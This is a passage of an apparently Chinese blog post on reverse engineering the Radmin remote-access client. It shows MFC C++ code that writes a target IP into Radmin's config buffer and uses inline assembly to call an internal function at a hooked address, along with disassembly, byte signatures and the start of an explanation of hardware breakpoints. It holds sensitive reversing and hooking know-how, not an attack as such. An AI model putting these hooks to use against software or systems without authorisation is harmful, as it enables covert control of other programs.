class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">helpHook::OnBnClickedButton1</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">char</span> dwOpenIP[MAX_PATH+<span class=\"number\">1</span>]=&#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\tCString strIP;</span><br><span class=\"line\">\t<span class=\"built_in\">GetDlgItem</span>(IDC_EDIT1)-&gt;<span class=\"built_in\">GetWindowText</span>(strIP);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (strIP.<span class=\"built_in\">GetLength</span>()!=<span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">lstrcpyA</span>(dwOpenIP,strIP.<span class=\"built_in\">GetString</span>());</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tCButton* radio_1=(CButton*)<span class=\"built_in\">GetDlgItem</span>(IDC_RADIO1);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (radio_1-&gt;<span class=\"built_in\">GetCheck</span>())</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">this</span>-&gt;<span class=\"built_in\">LoadIP</span>(<span class=\"number\">0x9C49</span>,<span class=\"string\">&quot;\\\\radmin.rpb&quot;</span>,dwOpenIP);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tCButton* radio_2=(CButton*)<span class=\"built_in\">GetDlgItem</span>(IDC_RADIO2);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (radio_2-&gt;<span class=\"built_in\">GetCheck</span>())</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">this</span>-&gt;<span class=\"built_in\">LoadIP</span>(<span class=\"number\">0x9C4B</span>,<span class=\"string\">&quot;\\\\radmin.rpb&quot;</span>,dwOpenIP);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tCButton* radio_3=(CButton*)<span class=\"built_in\">GetDlgItem</span>(IDC_RADIO3);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (radio_3-&gt;<span class=\"built_in\">GetCheck</span>())</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">this</span>-&gt;<span class=\"built_in\">LoadIP</span>(<span class=\"number\">0x9C4C</span>,<span class=\"string\">&quot;\\\\radmin.rpb&quot;</span>,dwOpenIP);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>-&gt;<span class=\"built_in\">MessageBox</span>(<span class=\"string\">&quot;请输入要连接的IP&quot;</span>,<span class=\"string\">&quot;提示&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//Sleep(1000);</span></span><br><span class=\"line\">\t<span class=\"type\">char</span> dwOpenUser[MAX_PATH+<span class=\"number\">1</span>]=&#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\tCString strUser;</span><br><span class=\"line\">\t<span class=\"built_in\">GetDlgItem</span>(IDC_EDIT2)-&gt;<span class=\"built_in\">GetWindowText</span>(strUser);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!strUser.<span class=\"built_in\">GetLength</span>())</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>-&gt;<span class=\"built_in\">MessageBox</span>(<span class=\"string\">&quot;请输入ID&quot;</span>,<span class=\"string\">&quot;提示&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">char</span> dwOpenPassWord[MAX_PATH+<span class=\"number\">1</span>]=&#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\tCString strPassWord;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">GetDlgItem</span>(IDC_EDIT3)-&gt;<span class=\"built_in\">GetWindowText</span>(strPassWord);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!strPassWord.<span class=\"built_in\">GetLength</span>())</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>-&gt;<span class=\"built_in\">MessageBox</span>(<span class=\"string\">&quot;请输入PassWord&quot;</span>,<span class=\"string\">&quot;提示&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">lstrcpyA</span>(dwOpenUser,strUser.<span class=\"built_in\">GetString</span>());</span><br><span class=\"line\">\t<span class=\"built_in\">lstrcpyA</span>(dwOpenPassWord,strPassWord.<span class=\"built_in\">GetString</span>());</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(<span class=\"keyword\">this</span>-&gt;gIP_Buffer,<span class=\"number\">0</span>,MAX_PATH+<span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(<span class=\"keyword\">this</span>-&gt;gUser_Buffer,<span class=\"number\">0</span>,MAX_PATH+<span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(<span class=\"keyword\">this</span>-&gt;gPass_Buffer,<span class=\"number\">0</span>,MAX_PATH+<span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">lstrcpyA</span>(<span class=\"keyword\">this</span>-&gt;gIP_Buffer,dwOpenIP);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">lstrcpyA</span>(<span class=\"keyword\">this</span>-&gt;gUser_Buffer,dwOpenUser);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">lstrcpyA</span>(<span class=\"keyword\">this</span>-&gt;gPass_Buffer,dwOpenPassWord);</span><br><span class=\"line\"></span><br><span class=\"line\">\tCallConnectThread = <span class=\"built_in\">AfxBeginThread</span>(OnCallConnect, <span class=\"keyword\">this</span>);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">BOOL  <span class=\"title\">helpHook::LoadIP</span><span class=\"params\">(DWORD szID,<span class=\"type\">char</span> * szFilePath,<span class=\"type\">char</span> * szConnectIPAddress)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> dwDir[MAX_PATH+<span class=\"number\">1</span>] =&#123;<span class=\"number\">0</span>&#125;; </span><br><span class=\"line\">\t<span class=\"type\">char</span> data[MAX_PATH*<span class=\"number\">4</span>]=&#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t<span class=\"built_in\">GetCurrentDirectoryA</span>( MAX_PATH+<span class=\"number\">1</span>,dwDir);   \t\t<span class=\"comment\">// 获取目录</span></span><br><span class=\"line\">\t<span class=\"built_in\">lstrcatA</span>(dwDir,szFilePath);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"built_in\">lstrlenA</span>(szConnectIPAddress)==<span class=\"number\">0</span> || szID==<span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> FALSE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">//this-&gt;MessageBox(dwDir,NULL);</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tHANDLE hFile=<span class=\"built_in\">CreateFileA</span>(\t\t\t\t\t <span class=\"comment\">// 打开rpb配置文件，文件不存在CreateFile不会创建，创建文件是mfc自己封装的</span></span><br><span class=\"line\">\t\tdwDir,</span><br><span class=\"line\">\t\tGENERIC_READ|GENERIC_WRITE,</span><br><span class=\"line\">\t\tFILE_SHARE_READ|FILE_SHARE_WRITE,</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>,     </span><br><span class=\"line\">\t\tOPEN_EXISTING,</span><br><span class=\"line\">\t\tFILE_ATTRIBUTE_NORMAL,   </span><br><span class=\"line\">\t\t<span class=\"number\">0</span>); </span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (hFile==INVALID_HANDLE_VALUE)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> FALSE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tDWORD size_low,size_high;</span><br><span class=\"line\">\tsize_low= <span class=\"built_in\">GetFileSize</span>(hFile,&amp;size_high); \t\t<span class=\"comment\">// 获取文件长度</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (size_low==<span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">CloseHandle</span>(hFile);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> FALSE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tHANDLE hMapFile=<span class=\"built_in\">CreateFileMappingA</span>(  \t\t<span class=\"comment\">// 创建文件映射，将文件映射到内存中，返回内存文件指针</span></span><br><span class=\"line\">\t\thFile,     </span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>,   </span><br><span class=\"line\">\t\tPAGE_READWRITE,</span><br><span class=\"line\">\t\tsize_high,    </span><br><span class=\"line\">\t\tsize_low,</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>);   </span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(hMapFile==INVALID_HANDLE_VALUE)   </span><br><span class=\"line\">\t&#123;   </span><br><span class=\"line\">\t\t<span class=\"built_in\">CloseHandle</span>(hMapFile);</span><br><span class=\"line\">\t\t<span class=\"built_in\">CloseHandle</span>(hFile);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> FALSE;   </span><br><span class=\"line\">\t&#125;  </span><br><span class=\"line\">\t<span class=\"type\">void</span>* pvFile=<span class=\"built_in\">MapViewOfFile</span>(\t\t\t\t</span><br><span class=\"line\">\t\thMapFile, </span><br><span class=\"line\">\t\tFILE_MAP_READ|FILE_MAP_WRITE, </span><br><span class=\"line\">\t\t<span class=\"number\">0</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0</span>);  </span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!pvFile)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (pvFile!=<span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">UnmapViewOfFile</span>(pvFile);\t\t\t<span class=\"comment\">// 释放内存映射</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (pvFile!=<span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">UnmapViewOfFile</span>(pvFile);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (hFile!=<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">CloseHandle</span>(hFile);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> FALSE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tLPVOID pvBuffer=<span class=\"built_in\">VirtualAlloc</span>(<span class=\"literal\">NULL</span>,size_low,MEM_COMMIT,PAGE_READWRITE);\t\t\t<span class=\"comment\">// 分配内存</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pvBuffer!=<span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">memcpy</span>((<span class=\"type\">char</span> *)pvBuffer,(<span class=\"type\">char</span> *)pvFile,size_low);\t\t\t\t\t\t\t<span class=\"comment\">// 内存拷贝</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>((<span class=\"type\">char</span> *)pvBuffer+<span class=\"number\">0x13C0</span>,<span class=\"number\">0</span>,<span class=\"number\">0x190</span>);</span><br><span class=\"line\">\t<span class=\"type\">wchar_t</span> dwIP[MAX_PATH+<span class=\"number\">1</span>]=&#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t<span class=\"type\">int</span> len=<span class=\"built_in\">MultiByteToWideChar</span>(CP_ACP, <span class=\"number\">0</span>, szConnectIPAddress, <span class=\"number\">-1</span>, <span class=\"literal\">NULL</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">MultiByteToWideChar</span>(CP_ACP, <span class=\"number\">0</span>, szConnectIPAddress, <span class=\"number\">-1</span>, dwIP, len);</span><br><span class=\"line\">\t<span class=\"built_in\">wcscpy</span>((<span class=\"type\">wchar_t</span> *)((<span class=\"type\">char</span> *)pvBuffer+<span class=\"number\">0x13C1</span>),dwIP);</span><br><span class=\"line\">\t<span class=\"built_in\">wcscpy</span>((<span class=\"type\">wchar_t</span> *)((<span class=\"type\">char</span> *)pvBuffer+<span class=\"number\">0x1489</span>),dwIP);</span><br><span class=\"line\">\t<span class=\"comment\">//调用call</span></span><br><span class=\"line\">\tDWORD this_offset=(DWORD)pvBuffer+<span class=\"number\">0x99</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t__try</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t__asm</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tpushad</span><br><span class=\"line\">\t\t\tmov esi,<span class=\"number\">0</span></span><br><span class=\"line\">\t\t\tmov eax,szID</span><br><span class=\"line\">\t\t\tmov edi,this_offset</span><br><span class=\"line\">\t\t\tpush eax</span><br><span class=\"line\">\t\t\tpush edi</span><br><span class=\"line\">\t\t\tmov  ecx,esi</span><br><span class=\"line\">\t\t\tmov  eax,OpenCallAddr</span><br><span class=\"line\">\t\t\tcall eax</span><br><span class=\"line\">\t\t\tpopad</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t__except(<span class=\"number\">1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">VirtualFree</span>(pvBuffer,size_low,MEM_RELEASE);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pvFile!=<span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">UnmapViewOfFile</span>(pvFile);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pvFile!=<span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">UnmapViewOfFile</span>(pvFile);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (hFile!=<span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">CloseHandle</span>(hFile);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> TRUE;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">radmin 功能函数分析</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">使用PELoader动态加载方式，代码解密后运行在内存，OEP关键代码</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">03</span> <span class=\"number\">55</span> <span class=\"number\">94</span> <span class=\"number\">89</span> <span class=\"number\">55</span> A4 <span class=\"number\">8B</span> <span class=\"number\">45</span> A4 FF E0</span><br><span class=\"line\"></span><br><span class=\"line\">一：打开要连接的虚拟机平台</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">(<span class=\"number\">1</span>:特征码)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">8B</span> B4 <span class=\"number\">24</span> EC <span class=\"number\">7B</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">50</span> <span class=\"number\">57</span> <span class=\"number\">8</span>D <span class=\"number\">95</span> <span class=\"number\">58</span> <span class=\"number\">34</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">8B</span> <span class=\"built_in\">CE</span></span><br><span class=\"line\"></span><br><span class=\"line\">(<span class=\"number\">2</span>:功能）</span><br><span class=\"line\"></span><br><span class=\"line\">打开对话框CALL</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">01438544</span>    <span class=\"number\">8B</span>B424 EC7B0000 mov     esi,dword ptr ss:[esp+<span class=\"number\">0x7BEC</span>]</span><br><span class=\"line\"><span class=\"number\">0143854B</span>    <span class=\"number\">50</span>              push    eax</span><br><span class=\"line\"><span class=\"number\">0143854</span>C    <span class=\"number\">57</span>              push    edi</span><br><span class=\"line\"><span class=\"number\">0143854</span>D    <span class=\"number\">8</span>D95 <span class=\"number\">58340000</span>   lea     edx,dword ptr ss:[ebp+<span class=\"number\">0x3458</span>]</span><br><span class=\"line\"><span class=\"number\">01438553</span>    <span class=\"number\">8B</span>CE            mov     ecx,esi</span><br><span class=\"line\"><span class=\"number\">01438555</span>    E8 <span class=\"number\">56690000</span>     call    <span class=\"number\">0143</span>EEB0</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">调用例子：</span><br><span class=\"line\"></span><br><span class=\"line\">pushad</span><br><span class=\"line\">mov esi,<span class=\"number\">0x00BB0DE4</span></span><br><span class=\"line\">mov eax,<span class=\"number\">0x9C49</span></span><br><span class=\"line\">mov edi,<span class=\"number\">0x0093BB6C</span></span><br><span class=\"line\">push eax</span><br><span class=\"line\">push edi</span><br><span class=\"line\">mov  ecx,esi</span><br><span class=\"line\">mov  eax,<span class=\"number\">0x0143EEB0</span></span><br><span class=\"line\">call eax</span><br><span class=\"line\"><span class=\"built_in\">popad</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">(<span class=\"number\">3</span>:参数分析)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">eax = <span class=\"number\">00009</span>C49 功能号</span><br><span class=\"line\"></span><br><span class=\"line\">ecx=基址[uxtheme.dll+<span class=\"number\">0x50C5C</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">esi=C:\\Users\\fku\\AppData\\Roaming\\Radmin\\radmin.rpb 文件指针 对应代码</span><br><span class=\"line\"></span><br><span class=\"line\">特征码：<span class=\"number\">8B</span> <span class=\"number\">6</span>C <span class=\"number\">24</span> <span class=\"number\">6</span>C <span class=\"number\">8B</span> <span class=\"number\">44</span> <span class=\"number\">24</span> <span class=\"number\">5</span>C <span class=\"number\">89</span> <span class=\"number\">84</span> <span class=\"number\">24</span> <span class=\"number\">9</span>E <span class=\"number\">36</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">39</span> <span class=\"number\">5</span>D <span class=\"number\">08</span> <span class=\"number\">88</span> <span class=\"number\">9</span>C <span class=\"number\">24</span> <span class=\"number\">9</span>D <span class=\"number\">36</span> <span class=\"number\">00</span> <span class=\"number\">00</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">014157</span>A6    <span class=\"number\">8B</span>6C24 <span class=\"number\">6</span>C       mov     ebp,dword ptr ss:[esp+<span class=\"number\">0x6C</span>]</span><br><span class=\"line\"><span class=\"number\">014157</span>AA    <span class=\"number\">8B</span>4424 <span class=\"number\">5</span>C       mov     eax,dword ptr ss:[esp+<span class=\"number\">0x5C</span>]</span><br><span class=\"line\"><span class=\"number\">014157</span>AE    <span class=\"number\">898424</span> <span class=\"number\">9E360000</span> mov     dword ptr ss:[esp+<span class=\"number\">0x369E</span>],eax</span><br><span class=\"line\"><span class=\"number\">014157B</span>5    <span class=\"number\">395</span>D <span class=\"number\">08</span>         cmp     dword ptr ss:[ebp+<span class=\"number\">0x8</span>],ebx</span><br><span class=\"line\"><span class=\"number\">014157B</span>8    <span class=\"number\">889</span>C24 <span class=\"number\">9</span>D360000 mov     byte ptr ss:[esp+<span class=\"number\">0x369D</span>],bl</span><br><span class=\"line\"><span class=\"number\">014157B</span>F    <span class=\"number\">75</span> <span class=\"number\">11</span>           jnz     <span class=\"type\">short</span> <span class=\"number\">014157</span>D2</span><br><span class=\"line\"><span class=\"number\">014157</span>C1    <span class=\"number\">8</span>D8C24 B01E0000 lea     ecx,dword ptr ss:[esp+<span class=\"number\">0x1EB0</span>]</span><br><span class=\"line\"><span class=\"number\">014157</span>C8    <span class=\"number\">51</span>              push    ecx</span><br><span class=\"line\"><span class=\"number\">014157</span>C9    <span class=\"number\">8B</span>CD            mov     ecx,ebp</span><br><span class=\"line\"><span class=\"number\">014157</span>CB    E8 C03D0000     call    <span class=\"number\">01419590</span>                <span class=\"comment\">//调用完读取radmin.rpb后返回文件buffer指针在EAX中存放。</span></span><br><span class=\"line\"><span class=\"number\">014157</span>D0    EB <span class=\"number\">46</span>           jmp     <span class=\"type\">short</span> <span class=\"number\">01415818</span></span><br><span class=\"line\"><span class=\"number\">014157</span>D2    <span class=\"number\">68</span> <span class=\"number\">00180000</span>     push    <span class=\"number\">0x1800</span></span><br><span class=\"line\"><span class=\"number\">014157</span>D7    E8 <span class=\"number\">4F</span>C70A00     call    <span class=\"number\">014</span>C1F2B</span><br><span class=\"line\"><span class=\"number\">014157</span>DC    <span class=\"number\">83</span>C4 <span class=\"number\">04</span>         add     esp,<span class=\"number\">0x4</span></span><br><span class=\"line\"><span class=\"number\">014157</span>DF    <span class=\"number\">3B</span>C3            cmp     eax,ebx</span><br><span class=\"line\"><span class=\"number\">014157E1</span>    <span class=\"number\">74</span> <span class=\"number\">64</span>           je      <span class=\"type\">short</span> <span class=\"number\">01415847</span></span><br><span class=\"line\"><span class=\"number\">014157E3</span>    <span class=\"number\">8</span>D9424 B01E0000 lea     edx,dword ptr ss:[esp+<span class=\"number\">0x1EB0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">hook的位置：</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0141581</span>C    <span class=\"number\">8</span>D5424 <span class=\"number\">54</span>       lea     edx,dword ptr ss:[esp+<span class=\"number\">0x54</span>]</span><br><span class=\"line\"><span class=\"number\">01415820</span>    <span class=\"number\">52</span>              push    edx</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">hook后获取radmin.rpb buffer指针用来调CALL用。</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"硬件断点原理\"><a class=\"markdownIt-Anchor\" href=\"#硬件断点原理\">#</a> 硬件断点原理</h3>\n<p>Intel 80306 以上的 CPU 给我们提供了调试寄存器用于软件调试，硬件断点是通过设置调试寄存器实现的。</p>\n<p>根据介绍，DR0-DR3 为设置断点的地址，DR4 和 DR5 为保留，</p>\n<p>DR6 为调试异常产生后显示的一些信息，DR7 保存了断点是否启用、断点类型和长度等信息。</p>\n<p>我们在使用硬件断点的时候，就是要设置调试寄存器，将断点的位置设置到 DR0-DR3 中，断点的长度设置到 DR7 的 LEN0-LEN3 中，将断点的类型设置到 DR7 的 RW0-RW3 中，将是否启用断点设置到 DR7 的 L0-L3 中。</p>\n<p>设置硬件断点需要的 DR0-DR3 很简单，就是下断点的地址，DR7 寄存器很复杂，位段信息结构体如下</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span 